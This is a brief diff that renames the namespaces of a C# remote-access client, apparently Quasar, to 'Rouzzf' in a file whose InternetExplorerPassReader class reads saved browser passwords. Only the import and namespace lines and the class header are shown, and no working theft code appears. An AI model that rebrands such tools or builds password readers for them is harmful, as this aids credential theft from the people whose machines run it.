@@ -1,6 +1,6 @@
 ﻿using Microsoft.Win32;
-using Quasar.Client.Helper;
-using Quasar.Common.Models;
+using Rouzzf.Client.Helper;
+using Rouzzf.Common.Models;
 using System;
 using System.Collections;
 using System.Collections.Generic;
@@ -11,7 +11,7 @@ using System.Runtime.InteropServices;
 using System.Security.Cryptography;
 using System.Text;
 
-namespace Quasar.Client.Recovery.Browsers
+namespace Rouzzf.Client.Recovery.Browsers
 {
     public class InternetExplorerPassReader : IAccountReader
     {
